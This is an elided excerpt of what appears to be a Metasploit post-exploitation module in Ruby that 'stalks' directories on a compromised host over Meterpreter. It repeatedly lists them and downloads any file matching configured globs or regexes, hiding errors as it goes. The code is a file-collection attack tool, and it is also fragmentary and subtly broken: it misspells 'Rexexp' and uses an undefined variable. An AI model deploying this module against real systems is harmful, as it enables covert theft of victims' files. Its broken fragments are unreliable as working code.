...
#	include Msf::Post::File
	...
	def run
		...
		@regex = Regexp.new(datastore['REGEX']) || nil
		# convert any globs to a long regular expression
		@globs_regex = 
			Rexexp.new(datastore['GLOBS'].gsub('.','\.').gsub('*','.*').gsub(',' , '$|')+"$") || nil
		
		@paths_arr = datastore['DIRS'].split(',')
		@delay = datastore['DELAY'] || 0
		@depth = datastore['DEPTH'] || 0
		@current_depth = 0
		@always = datastore['ALWAYS']
		stalk(@paths_arr,@globs_regex,@regex) unless @paths_arr.empty?
	...
	def stalk(paths,globs,regex=nil)
		# TODO: confirm atleast one valid directory?  If not, error?
		
		bug("globs_regex is #{globs}, regex is #{regex}")
		
		# get INITIAL file listing and scrape any matching files
		@delta = []
		begin
			@initial = scrape(paths,always,globs,regex)
		rescue Rex::Post::Meterpreter::RequestError
			# Handle directories that do not exist by eating the error
		ensure
			# reset depths
			@depth = datastore['DEPTH'] || 0
			@current_depth = 0
		...
		# get DELTA: periodically get file listing and scrape any matching files
		if datastore['DURATION'] != 0
			start = Time.new()
			print_status("Stalking files, start time:  #{start}")

			# trap to gracefully handle user forcefully terminating us
			trapped = false
			Kernel.trap( "INT" ) { trapped = true }
			while ( !trapped and ((Time.new - start) < datastore['DURATION'] or datastore['DURATION'] == -1) )
				begin
					@delta += scrape(paths,true,globs,regex)
					select(nil, nil, nil, @delay) # use select to create a delay
				rescue Rex::Post::Meterpreter::RequestError
					# Handle directories that do not exist by eating the error
				end
				# reset depths
	...
	def scrape(dirs=[], download=true, globs, regex)
		# dirs is an array and should ideally be full paths
		...
		dirs.each do |adir|
			...
			files.each do |f|
				...
				# elsif the file matches the glob regex or the standard regex, and not already included
				elsif ((f =~ globs or f =~ regex) and not @initial.include?(fullname) and not @delta.include?(fullname))
		...
		if not dirs_to_recurse.empty?
			delta += scrape(dirs_to_recurse,download,globs,regex)
		end
		delta.uniq.flatten  # get rid of duplicates and flatten
	end
end
